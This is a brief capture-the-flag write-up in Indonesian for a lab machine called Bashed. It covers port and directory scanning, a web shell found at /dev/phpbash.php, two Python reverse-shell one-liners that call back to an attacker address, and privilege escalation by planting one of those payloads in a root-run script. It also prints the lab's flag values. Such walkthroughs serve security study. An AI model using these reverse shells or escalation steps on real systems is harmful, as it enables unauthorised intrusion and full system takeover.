
| PORT | STATE | SERVICE | VERSION                       |
|------|-------|---------|-------------------------------|
| 80/tcp | open  | http    | Apache httpd 2.4.18 (Ubuntu) |


# Exploit

|   Status | Size | Words | Lines | Duration | URL          |
|---------:|-----:|------:|------:|---------:|-------------:|
|      301 |  311 |    20 |    10 |       85 | /images      |
|      301 |  312 |    20 |    10 |       96 | /uploads     |
|      301 |  308 |    20 |    10 |      186 | /php         |
|      301 |  308 |    20 |    10 |      176 | /css         |
|      301 |  308 |    20 |    10 |       86 | /dev         |
|      301 |  307 |    20 |    10 |      108 | /js          |
|      301 |  310 |    20 |    10 |       76 | /fonts       |


```url
http://10.10.10.68/dev/phpbash.php
```

nah di sini kita bisa melakukan apapun dengan bash, untuk reverse shell kita bisa menggunakan python

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```


# User FLAG

```bash
(remote) www-data@bashed:/home/arrexel$ cat user.txt 
9eb57838741812adf7e5f70158845282
```

# ROOT FLAG

```bash
 sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

```bash
(remote) www-data@bashed:/home/scriptmanager$ sudo -u scriptmanager /bin/bash
scriptmanager@bashed:~$ 
```

```bash
2024/06/23 02:50:01 CMD: UID=0     PID=1969   | python test.py 
```

tambahkan code python ini ke file test.py, yang ada di folder /scripts
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
```

dan nyalakan reverse shell, dan juga gunakan pspy64

**ROOT FLAG**
```bash
(remote) root@bashed:/root# cat root.txt 
6b2c3cd6939c734638ee0ecefe46bae8
```